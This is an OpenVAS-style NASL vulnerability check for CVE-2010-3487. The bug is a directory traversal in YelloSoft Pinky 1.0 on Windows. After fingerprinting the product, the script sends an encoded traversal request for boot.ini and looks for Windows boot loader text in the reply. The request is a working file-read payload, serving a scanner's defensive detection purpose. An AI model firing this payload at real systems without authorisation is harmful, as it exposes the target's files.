if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902253" );
	script_version( "2021-09-01T09:31:49+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 09:31:49 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2010-09-29 09:26:02 +0200 (Wed, 29 Sep 2010)" );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_cve_id( "CVE-2010-3487" );
	script_name( "YelloSoft Pinky Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/41538" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/1009-exploits/pinky10-traversal.txt" );
	script_xref( name: "URL", value: "http://www.johnleitch.net/Vulnerabilities/Pinky.1.0.Directory.Traversal/42" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 2323 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to gain information
about directory and file locations." );
	script_tag( name: "affected", value: "Yellosoft pinky version 1.0 and prior on windows." );
	script_tag( name: "insight", value: "Input passed via the URL is not properly verified before being
 used to read files. This can be exploited to download arbitrary files via
directory traversal attacks." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "This host is running YelloSoft Pinky and is prone to Directory
Traversal vulnerability." );
	script_tag( name: "qod_type", value: "registry" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 2323 );
res = http_get_cache( item: NASLString( "/index.html" ), port: port );
if(ContainsString( res, "<title>Pinky</title" ) && ContainsString( res, ">YelloSoft<" )){
	request = http_get( item: "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C.." + "/%5C../%5C../boot.ini", port: port );
	response = http_keepalive_send_recv( port: port, data: request );
	if(( ContainsString( response, "\\WINDOWS" ) ) && ( ContainsString( response, "boot loader" ) )){
		security_message( port );
	}
}

